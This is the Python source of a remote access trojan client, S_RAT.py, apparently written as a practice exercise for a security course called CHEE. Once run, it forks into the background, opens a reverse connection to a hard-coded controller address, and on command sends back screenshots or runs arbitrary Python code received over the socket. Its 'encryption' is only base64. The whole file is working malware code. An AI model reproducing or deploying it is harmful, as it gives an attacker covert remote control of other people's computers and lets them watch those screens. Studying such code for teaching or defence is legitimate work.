#!/usr/bin/env python
# -*- coding: utf-8 -*-

###############################################################################
#  Fco. Javier Rodriguez Navarro 
#
#  S_RAT.py: Esclavo o parte que se instala en el ordenador a controlar.
#            es un servidor ya que realiza las ordenes del maestro pero su 
#            inicio es con una conexión inversa.
#
#  Historico:
#     - 12/5/2019 1.0 Version inicio para curso CHEE.
#
###############################################################################
import sys
import os
import socket
import logging
import datetime
import threading
import time
import pickle
import mss 
from Tkinter import *
import base64

logging.basicConfig(level=logging.CRITICAL) # Poner CRITICAL en prod.
# crea un socket INET de tipo STREAM para la comunicacion y es global a S_RAT
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Configurar Variables del cliente Maestro Globales
HOST = "192.168.1.195"
PORT = 8484
Clave = "ElCursoCHEEPractica8"
 
def main(argv):
    
    # Generamos proceso Hijo que es el que existira, al padre se mata
    pid = 0   # Identificador de PID
    pid = creaHijo()  #Creamos el hijo "fork" que sera el que se ejectuar.

    # Llamamos a Maestro para establecer comunicación y parametros
    s.connect((HOST,PORT))
    
    #Preparamos el primer mensaje para entablar conversación
    #Le damos nombre host y plataforma.
    parametros={}
    parametros.update({'H1':os.uname()[1],'H2':sys.platform,'PaR':2})
    
    dato="H:"+ pickle.dumps(parametros,pickle.HIGHEST_PROTOCOL)   
    
    # Envia dato, que se encripta antes
    envia(dato,Clave)
    # Esperamos respuesta que sera la clave con la que se trabajara.
    clave = recibe(Clave) 

    #Lanzamos el bucle de escucha
    while True:
        logging.info("Escuchando: %s:%d,%s",HOST,PORT,clave)
        datos = recibe(clave) # Esperamos comandos.
       
        #Lanzamos lo recibido para el analisis
        if analisis(datos,Clave):
           logging.info("Comando OK") 
        else:
           logging.error("Comando Erroneo %s", datos) 

          
################################################################################
#   analisis(datos) Realiza analisis de comandos
################################################################################
def analisis(datos,Clave):

    logging.info("Analizamos: %s",datos)
        
    # Desconexión
    if datos[0:2] == 'S:':
       s.close()
       logging.info("Se cierra")
       sys.exit(0)

    # Se solicita captura de pantalla
    if datos[0:3] == 'SC:':
        logging.info("Se solicita captura de pantalla")
        with mss.mss() as sct:
            sct_img = sct.grab(sct.monitors[1]) #Graba a ScreenShot la pantalla
        datos = mss.tools.to_png(sct_img.rgb, sct_img.size)
        envia(datos,Clave)
        return True

    # Se solicita una ejecución de codigo Python
    if datos[0:3] == 'EJ:':
        logging.info("Se solicita ejecutar codigo ventana Hack")
        fuente = recibe(Clave)
        hilo = threading.Thread(target=ejecuta, args=(fuente, ))
        hilo.setDaemon(True)
        hilo.start()
        return True
       
    return False

################################################################################
#   ejecuta(codigo) Ejecuta el codigo en un Threead que se crea.
################################################################################
def ejecuta(codigo):
    logging.info("Se ejecuta %s",codigo)
    exec(codigo)


################################################################################
#   envia(mensaje,clave) Encriptael mensaje y lo envia.
#   recibe(clave) Espera la recepción y al llegar lo desencripta.
#                        poner tamano si mayor de 1024 o se conoce.
################################################################################
def envia(mensaje,clave):
  
    #Realizamos la encriptación y el Base64
    mensaje = encripta(mensaje,clave)
    totalenviado =0
    longitud = len(mensaje)
    # Pasamos la longitud   
    datos = str(longitud).zfill(24) #Relleno 0 hasta 24 bytes
    logging.info("Envia longitud --> %s",datos)
    while totalenviado < 24:
        enviado = s.send(datos[totalenviado:])
        if enviado == 0:
            logging.error("Conexión ROTA")
        totalenviado = totalenviado + enviado

    # Pasamos los datos
    logging.info("Envia --> %s <-- %s >--",mensaje[:15],mensaje[-15:])
    totalenviado = 0  
    while totalenviado < longitud:
        enviado = s.send(mensaje[totalenviado:])
        if enviado == 0:
            logging.error("Conexión ROTA")
        totalenviado = totalenviado + enviado

    
def recibe(clave):
    buf = b''
    tamano = 0
    # Recogemos la longitud del mensaje a recibir.
    while len(buf) < 24:
        recibido = s.recv(24-len(buf))
        buf = buf + recibido
  
    tamano = int(buf[:24])
    logging.info("Se esperan %d datos",tamano)
          
    # Recogemos el mensaje
    buf = b''
    while len(buf) < tamano:
        recibido = s.recv(tamano-len(buf))
        buf = buf + recibido
                    
    logging.info("FIN recepción %d-->%s<-->%s",len(buf),buf[:15],buf[-15:])

    return desencripta(buf,clave)
      

################################################################################
#   encripta(mensaje) Encripta mensaje y lo retorna encriptado.
#   desencripta(mensaje) Desencripta mensaje y lo retorna limpio.
################################################################################
def encripta(mensaje,clave):
    mensaje = base64.encodestring(mensaje)
    return mensaje


def desencripta(mensaje,clave):
    mensaje = base64.decodestring(mensaje + '=' * (-len(mensaje) % 4)) 
    return mensaje

################################################################################
#   creaHijo() Retorna el PID del HIJO
#
#   Esta funcion sirve para crear un hijo, matando al padre de forma que se
#   quede el hijo en Backgroud.
#
################################################################################
def creaHijo():

    logging.info("El padre es %d",os.getpid())
    newpid = os.fork()

    if newpid < 0:
        logging.critical("El proceso no puede crearse")
        os._exit(0)
    if newpid > 0:  # Estamos en Padre se mata.
        logging.info("Matamos el proceso padre %d",os.getpid())
        os._exit(0)

     
    logging.info("Generado el Hijo: %d",os.getpid())
    return os.getpid()


################# Lanzamiento de la funcion principal ##########################
if __name__ == "__main__":
    main(sys.argv)
